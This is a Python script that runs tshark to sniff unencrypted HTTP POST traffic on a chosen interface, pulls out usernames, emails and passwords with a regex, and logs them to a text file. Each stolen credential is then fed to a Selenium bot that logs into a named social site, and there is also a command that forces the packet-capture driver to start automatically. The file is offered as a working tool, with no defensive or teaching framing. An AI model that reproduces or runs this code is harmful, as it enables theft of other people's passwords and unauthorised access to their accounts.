# imports - standard imports
import re
import subprocess

# imports - third party imports
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


def __get_data__(cmd):
    # needs work ALSO CHECK: 'cmd' -a duration
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)  # , universal_newlines=True
    for line in iter(process.stdout.readline, b""):
        if "Capturing" in str(line):
            return
        elif line not in [None, '', ' ']:
            return __clean_data__(str(line))
        else:
            return


def __clean_data__(line):
    # line: input is raw data from tshark cmd
    # parser for extracting data, returns dict
    # format: {site:site-address, user:user-data, pass:pass-data}

    match_str = r"((user)|(email))[A-Za-z]*=[A-Za-z0-9]*(%40)?[a-zA-Z.]*&(pass)[A-Za-z]*=[A-Za-z0-9]*"
    ip_addr_str = r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"

    user_pass = re.search(match_str, line).group()
    ip = re.search(ip_addr_str, line).group()
    user, passw = user_pass.split('&')

    user = ''.join(user.split('=')[1:])
    passw = ''.join(passw.split('=')[1:])  # might have = in pass
    user = user.replace('%40', '@')
    # ((user)|(email))[A-Za-z]*=[A-Za-z0-9]*&(pass)[A-Za-z]*=[A-Za-z0-9]* for user/pass
    # ^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$ for IP address

    return {"site": ip, "user": user, "pass": passw}


def __select_interface__(tshark_path):
    interface_dict = {}
    counter = 0

    interface_path = tshark_path + " -D any"
    process = subprocess.Popen(interface_path, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    try:
        for line in iter(process.stdout.readline, b""):
            counter += 1
            address = str(line).split(' ')[1]
            try:
                name = re.findall(r"\([A-Za-z\-\s]*\)", str(line))[0]
            except:
                name = ''.join(str(line).split(' ')[2:])[:-5]
            interface_dict[counter] = {name: address}
    except:
        import os
        os.system("sc config npf start= auto")

    print("Select Interface:")
    for count, mini_dict in interface_dict.items():
        for name, val in mini_dict.items():
            print(f"{count} {name}")

    int_num = int(input())
    print(f"{interface_dict[int_num]} selected")

    for name in interface_dict[int_num].keys():
        interface = r" -i {} ".format(interface_dict[int_num][name])

    return interface


def sniff():
    print("Using Tshark")

    tshark_path = '"' + input("Enter tshark path: ") + '"'  # r"C:\Program Files\Wireshark\tshark.exe"

    interface = __select_interface__(tshark_path)
    method = r" -Y http.request.method==POST "
    e_data = r" -Tfields -e http.file_data -e ip.dst -a duration:10"
    cmd = tshark_path + interface + method + e_data

    print(cmd)  # final query in tshark

    while True:
        # print(get_data(cmd))
        data_read = __get_data__(cmd)
        try:
            print(data_read)
            with open("log_passw.txt", "a") as f:
                f.write(f"{data_read['site']}\t{data_read['user']}\t{data_read['pass']}\n")
                bot(data_read['user'], data_read['pass'])
        except TypeError:
            pass


def bot(ussr, passw):
    # special function made upon request
    url = r"http://findfriendz.com/login.php"
    browser = webdriver.Chrome("chromedriver.exe")
    browser.get(url)
    username = browser.find_element_by_id(id_='emailid')
    password = browser.find_element_by_id(id_='password')
    username.send_keys(ussr)
    password.send_keys(passw)
    password.send_keys(Keys.RETURN)


